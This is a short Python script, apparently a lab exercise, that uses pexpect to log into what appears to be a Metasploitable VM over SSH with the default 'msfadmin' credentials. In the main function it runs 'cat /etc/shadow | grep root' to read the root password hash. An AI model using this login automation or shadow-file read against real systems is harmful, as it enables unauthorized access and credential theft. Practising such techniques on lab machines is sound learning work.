import pexpect
PROMPT = ['# ', '>>> ', '> ', '\$ ', '~# ']
def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print (child.before, child.after)

def connect(hostkeyal, user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting (yes/no)?'
    connStr = 'ssh ' + hostkeyal + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect(['password:', ssh_newkey])
    if ret == 1:
        child.sendline('yes')
        ret = child.expect('password:')
    if ret != 0:
        print ('[-] Error Connecting')
        return  # THIS WILL RETURN A NONE SO YOU SHOULD CHECK FOR IT.  SHOULD EXPLICITLY DO A return None TO MAKE IT CLEARER
    child.sendline(password)
    child.expect(PROMPT)
    return child

def main():
    hostkeyal = ' -oHostKeyAlgorithms=+ssh-dss '
    host = '192.168.1.75'
    user = 'msfadmin'
    password = 'msfadmin'
    child = connect(hostkeyal,user, host, password)
    if child is not None:
        send_command(child, 'cat /etc/shadow | grep root; ps')
    else:
        print ("Problem connecting!")

if __name__ == '__main__':
    main()
